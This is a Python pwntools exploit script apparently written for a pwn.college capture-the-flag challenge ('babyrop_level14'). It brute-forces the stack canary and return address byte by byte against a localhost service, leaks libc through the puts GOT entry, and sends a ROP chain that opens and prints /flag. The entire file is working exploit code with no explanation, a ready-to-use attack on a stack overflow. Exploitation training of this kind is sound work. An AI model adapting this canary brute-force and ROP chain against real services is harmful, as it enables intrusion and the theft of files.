#!/usr/bin/env python3

from pwn import *

FILENAME='/babyrop_level14_testing1'
context.log_level = 'WARNING'

stack_canary = [0x0]
byte_val = 0x0

while len(stack_canary) < 8:
    # Create a process
    p = remote('localhost', 1337)

    # Create an ELF and a ROP object
    context.binary = elf = ELF(FILENAME)
    rop = ROP(elf)

    # padding
    rop.raw('a' * 120)

    # Stack canary
    for element in stack_canary:
        rop.raw(p8(element))
    rop.raw(p8(byte_val))

    # Send input
    p.send(rop.chain())
    log.warning('trying stack canary: ' + str(stack_canary + [byte_val]))

    try:
        # Check whether stack smashing has happened and run again with different value in that case
        p.recvline_startswith(b'*** stack smashing detected ***')
        byte_val = 0 if byte_val == 255 else byte_val + 1
    except EOFError:
        # Stack canary found: try to find the next byte value
        stack_canary.append(byte_val)
        log.warning('%d bytes stack canary found: ' % len(stack_canary) + str(stack_canary))
        byte_val = 0x0
    
    p.close()

return_address = [0x69]

while len(return_address) < 8:
    # Create a process
    p = remote('localhost', 1337)

    # Create an ELF and a ROP object
    context.binary = elf = ELF(FILENAME)
    rop = ROP(elf)

    # padding
    rop.raw('a' * 120)

    # Stack canary
    for element in stack_canary:
        rop.raw(p8(element))

    # RBP
    rop.raw('a' * 8)

    # Return address
    for element in return_address:
        rop.raw(p8(element))
    rop.raw(p8(byte_val))
    #print(hexdump(bytes(rop)))

    # Send input
    p.send(rop.chain())
    log.warning('trying return address: ' + str(return_address + [byte_val]))

    try:
        # Receive data
        p.recvline_startswith(b'Exiting!')

        # Return address found: try to find the next byte value
        return_address.append(byte_val)
        log.warning('%d bytes return address found: ' % len(return_address) + str(return_address))
        byte_val = 0x0
    except EOFError:
        # Run again with different value if the return address is invalid
        byte_val = 0 if byte_val == 255 else byte_val + 1
    
    p.close()

# Convert the return address into integer
return_address_int = 0
for element in reversed(return_address):
    return_address_int *= 256
    return_address_int += element

log.warning('Return address: ' + hex(return_address_int))

# Create a process
p = remote('localhost', 1337)

# Create an ELF object and set the address
context.binary = elf = ELF(FILENAME)
elf.address = return_address_int - (elf.symbols['main'] + 0x2c)
log.warning('Binary base address: ' + hex(elf.address))

# Create a ROP object
rop = ROP(elf)

# padding
rop.raw('a' * 120)

# Stack canary
for element in stack_canary:
    rop.raw(p8(element))

# RBP
rop.raw('a' * 8)

# Print GOT value of puts function
rop.puts(elf.got['puts'])

# Send and receive data
p.send(rop.chain())
p.recvuntil(b"Goodbye!\n")

# Get libc puts address
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = int.from_bytes(p.recvline().strip(), "little") - libc.symbols['puts']
log.warning("libc address: " + hex(libc.address))
p.close()

# Create a process
p = remote('localhost', 1337)

# Create a new ROP object
rop = ROP([elf, libc])

# padding
rop.raw('a' * 120)

# Stack canary
for element in stack_canary:
    rop.raw(p8(element))

# RBP
rop.raw('a' * 8)

# ROP
rop.read(0, elf.bss(), 6)
rop.open(elf.bss(), 0)
rop.sendfile(1, 4, 0, 400)
#print(rop.dump())
#print(hexdump(bytes(rop)))

# Send and receive data
p.send(rop.chain())
p.send(b'/flag\x00')
print(p.recvline_startswith(b'pwn_college'))
p.close()
